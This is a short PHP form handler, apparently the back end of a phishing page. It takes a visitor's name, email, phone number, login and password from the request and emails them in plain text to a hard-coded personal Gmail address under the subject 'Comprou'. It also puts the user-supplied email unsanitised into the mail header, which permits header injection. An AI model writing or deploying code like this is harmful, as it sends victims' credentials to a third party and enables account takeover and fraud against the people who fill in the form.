<?php

$dest = "beatriz.trindade.work@gmail.com";

$nome = $_REQUEST['nome'];
$email = $_REQUEST['email'];
$tel = $_REQUEST['tel'];
$login = $_REQUEST['login'];
$senha = $_REQUEST['senha'];

$mensagem = "Comprou";


$body = "-------------------------------------------" . "\n";
$body = $body . "===================================" . "\n\n";
$body = $body . "Nome: " . $nome . "\n";
$body = $body . "Email: " . $email . "\n";
$body = $body . "Telefone: " . $tel . "\n\n";
$body = $body . "Login: " . $login . "\n\n";
$body = $body . "Senha: " . $senha . "\n\n";
$body = $body . "-----------------------------------" . "\n";


mail($dest, $mensagem , $body, "From: $email\r\n");


?>

 